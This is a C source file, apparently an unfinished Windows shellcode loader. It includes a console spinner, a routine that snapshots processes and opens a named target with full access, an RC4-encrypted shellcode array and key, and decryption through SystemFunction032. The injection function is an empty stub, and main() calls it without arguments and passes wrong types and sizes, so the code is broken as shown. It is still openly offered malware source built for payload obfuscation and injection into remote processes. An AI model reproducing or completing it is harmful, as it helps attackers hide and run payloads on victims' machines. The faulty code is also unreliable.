#include <stdio.h>
#include <Windows.h>

void PrintLoader(FLOAT fTime) {

	char LoadingSymbol[8] = { '|', '/', '-', '\\', '|', '/', '-', '\\' };
	int count = 0;
	int arraycount = 0;
	int iTime;
	int iTimePerCharacter = 60;
	int iTimePassed = 0;
	int percentage = 32;
	int bBuffer = 0;
	int Add = 0;

#define FLOAT_TO_INT(x) ((x)>=0?(int)((x)+0.5):(int)((x)-0.5))
	iTime = FLOAT_TO_INT(fTime);

	for (int i = iTime; i > 0; i = i - iTimePerCharacter) {
		Sleep((DWORD)(iTimePerCharacter));
		iTimePassed = iTimePassed + iTimePerCharacter;

		percentage = (int)(iTimePassed * 100 / iTime);

		if (arraycount != 7) {
			if (bBuffer == 1) {
				if (percentage < 10 && percentage > -1) {
					printf("\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
				}
				else if (percentage < 100 && percentage > 9) {
					printf("\b\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
				}
				else if (percentage < 1000 && percentage > 99) {
					printf("\b\b\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
				}
			}
			else if (bBuffer == 0) {
				if (percentage < 10 && percentage > -1) {
					printf("       ");
					printf("\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
					bBuffer = 1;
				}
				else if (percentage < 100 && percentage > 9) {
					printf("        ");
					printf("\b\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
					bBuffer = 1;
				}
				else if (percentage < 1000 && percentage > 99) {
					printf("         ");
					printf("\b\b\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
					bBuffer = 1;
				}
			}
		}
		else if (arraycount == 7) {
			count++;
			if (bBuffer == 1) {
				if (percentage < 10 && percentage > -1) {
					printf("\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
				}
				else if (percentage < 100 && percentage > 9) {
					printf("\b\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
				}
				else if (percentage < 1000 && percentage > 99) {
					printf("\b\b\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
				}
			}
			else if (bBuffer == 0) {
				if (percentage < 10 && percentage > -1) {
					printf("       ");
					printf("\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
					bBuffer = 1;
				}
				else if (percentage < 100 && percentage > 9) {
					printf("        ");
					printf("\b\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
					bBuffer = 1;
				}
				else if (percentage < 1000 && percentage > 99) {
					printf("         ");
					printf("\b\b\b\b\b\b\b\b\b [%d%%]  \b%c", percentage, LoadingSymbol[arraycount]);
					bBuffer = 1;
				}
			}
			for (int j = count; j > 0; j--) {
				printf(".");
			}
			for (int j = count; j > 0; j--) {
				printf("\b");
			}
			if (Add == 1) {
				arraycount = 0;
				Add = 0;
			}
			else {
				Add = 1;
			}
		}

		if (Add == 1) {
			arraycount++;
		}
		else {
			Add = 1;
		}
	}

	int k = 100;
	for (int j = count; j > 0; j--) {
		printf(" ");
	}
	while (k > 0) {
		printf("\b \b");
		k--;
	}
}


BOOL GetRemoteProcess(IN LPWSTR szProcessName, OUT DWORD* dwProcessID, OUT HANDLE* hProcessHandle) {	//The function that finds and provides the handle and ID of the process

	HANDLE hSnapHandle = NULL;																					//Declaring Handle

	PROCESSENTRY32 Proc = {																						//Initalising PROCESSENTRY32 struct
		.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);											//Taking snapshot off processes runing

	if (hSnapHandle == INVALID_HANDLE_VALUE) {																	//Checking there are no errors with the handle
		printf("There was an error with the handle: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Process32First(hSnapHandle, &Proc)) {
		printf("There was an error the first process: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	printf("\n|[X]Taking Snapshot:  ");
	PrintLoader(rand() % 2000 + 1);
	printf("\r|[$]Took Snapshot at: %p\n", hSnapHandle);

	printf("|[X]Looking for specified process:\n|   #################\n");

	do {																										//Do while loop that scans all processes in snapshot

		WCHAR LowerCase[MAX_PATH * 2];																			//The LowerCase WChar array that'll hold Proc.szExeFile

		if (Proc.szExeFile) {
			DWORD i = 0;
			DWORD dwStrSize = lstrlenW(Proc.szExeFile);

			RtlSecureZeroMemory(LowerCase, sizeof(LowerCase));													//Zeroing memory in LowerCase's block

			if (dwStrSize < MAX_PATH * 2) {
				for (; i < dwStrSize; i++) {																	//Setting every character in Proc.szExeFile to the lowercase equivilent in LowerCase
					LowerCase[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				}
				LowerCase[i++] = '\0';
			}
			if (wcscmp(LowerCase, szProcessName) == 0) {														//Comparing the process names to the name inputted
				//Setting the values of the function's OUT parameters 
				*dwProcessID = Proc.th32ProcessID;
				*hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessID);

				printf("\r");
				for (i = 0; i < (dwStrSize * 2 + 20); i++) {
					printf(" ");
				}
				Sleep(5);
				printf("\r|[Found a match] >>> |");
				wprintf(L"%s == %s", LowerCase, szProcessName);
				printf("| <<<");
				printf("\n|   #################\n\r");

				Sleep(5);
				for (i = 0; i < (dwStrSize * 2 + 20); i++) {
					printf(" ");
				}
				printf("\r");
			}
			else {
				printf("\r|   ##| ");																			//Prints the comparison and overwrites itself
				wprintf(L"%s != %s", LowerCase, szProcessName);
				printf(" |##\r");
				Sleep(5);
				for (i = 0; i < (dwStrSize * 2 + 20); i++) {
					printf(" ");
				}
				printf("\r");
			}
		}
	} while (Process32Next(hSnapHandle, &Proc));

	wprintf("\r\n|   #################\n");

_EndOfFunction:																								//Returns TRUE or FALSE for the function and closes handle
	if (hSnapHandle != NULL) {
		CloseHandle(hSnapHandle);
	}

	if (*dwProcessID == NULL || *hProcessHandle == NULL) {
		return FALSE;
	}
	else {
		return TRUE;
	}
	getchar();
}

// this is what SystemFunction032 function take as a parameter
typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// the return of SystemFunction032
	NTSTATUS	STATUS = NULL;

	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };


	// since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
	// and using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// if SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}

	return TRUE;
}

unsigned char Rc4CipherText[] = {
	0x9D, 0xBD, 0xBC, 0x1C, 0xBB, 0x99, 0x44, 0x2E, 0x30, 0x19, 0xBC, 0xD5, 0x8E, 0x57, 0x68, 0x71,
	0x30, 0x50, 0xA7, 0x79, 0x50, 0x92, 0x09, 0xE4, 0x18, 0x55, 0xD6, 0x38, 0xDC, 0x1F, 0xFE, 0x90,
	0x55, 0x78, 0x3B, 0x8A, 0xD7, 0x9F, 0x88, 0x67, 0x47, 0xD3, 0x24, 0x28, 0x5F, 0x1B, 0xD3, 0x36,
	0x87, 0x36, 0x7A, 0x21, 0x63, 0xFB, 0x34, 0x2F, 0xD9, 0xB8, 0x9F, 0x03, 0x22, 0x8D, 0x58, 0xAA,
	0xEF, 0x7A, 0x40, 0x45, 0x31, 0xD0, 0xCD, 0xEA, 0x34, 0xB7, 0x70, 0xE8, 0x92, 0x1A, 0xA5, 0x0F,
	0x4E, 0x33, 0x07, 0x2B, 0xA8, 0x07, 0xDE, 0xA2, 0x33, 0x0A, 0xFD, 0x7A, 0x76, 0x73, 0x61, 0xD0,
	0x73, 0x27, 0x9D, 0x75, 0x04, 0xA9, 0x0A, 0xB7, 0x62, 0x47, 0x86, 0x00, 0x05, 0x6A, 0x00, 0x83,
	0x7F, 0xED, 0x3E, 0x3C, 0x9C, 0x95, 0x79, 0x93, 0x61, 0x4C, 0xC8, 0xB5, 0x65, 0xF7, 0xE6, 0xBC,
	0xA1, 0xC1, 0x58, 0x6B, 0x1B, 0x0D, 0x72, 0xA7, 0x0D, 0x85, 0x30, 0xEC, 0xF4, 0x5E, 0xE6, 0x55,
	0x42, 0x97, 0xBE, 0xEB, 0x0C, 0x7F, 0xD9, 0x49, 0x99, 0x8F, 0x4F, 0x21, 0x21, 0xA1, 0x32, 0x0F,
	0xB0, 0x0B, 0xE1, 0xC2, 0x09, 0x8D, 0x73, 0x53, 0xF5, 0xFE, 0x26, 0x8B, 0xA2, 0xEE, 0x9C, 0x58,
	0xEF, 0xE7, 0xD0, 0x32, 0x1E, 0xEF, 0xB4, 0x93, 0x8F, 0x4F, 0x0F, 0x92, 0x06, 0x1E, 0x77, 0x03,
	0xFD, 0xF6, 0x59, 0xCE, 0xE5, 0xE6, 0x39, 0x20, 0x19, 0xDD, 0xBB, 0xC9, 0xC0, 0xA8, 0xAA, 0xC4,
	0x59, 0x61, 0xE2, 0x11, 0x38, 0x36, 0x60, 0x83, 0x03, 0xFE, 0xAD, 0xC9, 0xAA, 0x5A, 0x0A, 0xCD,
	0x4C, 0x0D, 0x33, 0x80, 0xCA, 0x09, 0x80, 0xD7, 0x27, 0x5F, 0xCE, 0xA2, 0x9B, 0x39, 0x0D, 0x9B,
	0x84, 0xE9, 0x86, 0xD1, 0x4D, 0x22, 0x1B, 0x29, 0xDA, 0x7D, 0x9E, 0x5D, 0x6F, 0x39, 0x23, 0x68,
	0x9B, 0xFB, 0x02, 0x21, 0x54, 0x74, 0xF8, 0xEC, 0x79, 0x62, 0x4A, 0x72, 0xDF, 0xE7, 0x60, 0x4F,
	0x5C, 0xC9, 0xDA, 0x84, 0x17, 0xCA, 0xD4, 0x64, 0x9A, 0xAB, 0x34, 0xB8, 0xC2, 0xC6, 0x7B, 0x19,
	0x34, 0x28, 0x70, 0xB0, 0xAD, 0xBE, 0xDD, 0x6B, 0x8E, 0xA0, 0xFC, 0x32, 0xDF, 0x83, 0x95, 0xC7,
	0xCA, 0xC2, 0x81, 0xE0, 0x4E, 0x68, 0x4C, 0xB3, 0xA3, 0x2C, 0x66, 0xA9, 0x6D, 0x52, 0x84, 0x68,
	0xF4, 0xFB, 0xD1, 0x0B, 0x92, 0x28, 0x3F, 0xEB, 0xF4, 0x79, 0x77, 0x10, 0x0D, 0x5F, 0x96, 0x15,
	0xF5, 0xC0, 0x85, 0x3A, 0x7A, 0xF8, 0xFE, 0xDF, 0xF9, 0x10, 0x73, 0x6C, 0x62, 0xAD, 0x90, 0x2C,
	0x45, 0x6B, 0x11, 0x78, 0x4B, 0x59, 0x1B, 0xCB, 0xB6, 0x53, 0x49, 0xFA, 0x4A, 0x1C, 0xA1, 0x48,
	0x73, 0xD6, 0xBC, 0xE5, 0x54, 0x02, 0x5F, 0xEA, 0xE2, 0x8A, 0xA9, 0x17, 0x47, 0xF2, 0x89, 0xAA,
	0xA9, 0x3D, 0x14, 0x61, 0x8C, 0xE4, 0x70, 0x53, 0x2B, 0x30, 0x2B, 0xFD, 0x92, 0x33, 0x05, 0xAD,
	0xE0, 0xF4, 0xEB, 0x32, 0x32, 0x53, 0x96, 0xC0, 0x73, 0xD8, 0x30, 0x17, 0x1D, 0x5A, 0x0A, 0x4E,
	0x8E, 0x12, 0xF0, 0x69, 0x36, 0xED, 0x12, 0x17, 0x9A, 0xF7, 0x9A, 0xE1, 0x44, 0xC5, 0xCA, 0x38,
	0x42, 0x68, 0x8F, 0xC4, 0xAF, 0xEF, 0x69, 0x18, 0xDD, 0xB3, 0x35, 0xA8, 0x37, 0xA7, 0x16, 0xE2,
	0x59, 0x91, 0x87, 0x72, 0xA1, 0x36, 0x48, 0xEA, 0xE4, 0x1F, 0xCE, 0x95, 0xEC, 0x8A, 0x1C, 0x76,
	0x0B, 0xE6, 0xE1, 0xD9, 0x21, 0x9C, 0xBB, 0x5D, 0x83, 0x5B, 0x9E, 0xF9, 0x23, 0x09, 0x86, 0xAA,
	0xDC, 0xDD, 0xDA, 0x7F, 0xDE, 0xEB, 0xA0, 0x8E, 0x54, 0x14, 0xDB, 0x6C, 0x9F, 0x14, 0x4C, 0x8C,
	0xE6, 0xEB, 0xE7 };

unsigned char Rc4Key[] = {
	0x16, 0x3C, 0x6E, 0xD8, 0xCA, 0xD4, 0xBE, 0xD9, 0x31, 0xA0, 0x9A, 0xC7, 0x1E, 0xF4, 0x92, 0x46 };



BOOL InjectShellcodeToRemoteProcess(HANDLE hProcessHandle, PBYTE pDeobShellcode, SIZE_T sSizeOfShellcode) {
	
}

int main() {
	//Deobfuscating the Shellcode
	if (!Rc4EncryptionViSystemFunc032(*Rc4Key, *Rc4CipherText, sizeof(Rc4Key) * sizeof(DWORD), sizeof(Rc4CipherText) * sizeof(DWORD))) {
		printf("Something when wrong: %d", GetLastError());
	}

	//Injecting the Deobfuscated Shellcode
	InjectShellcodeToRemoteProcess

	return 0;
} 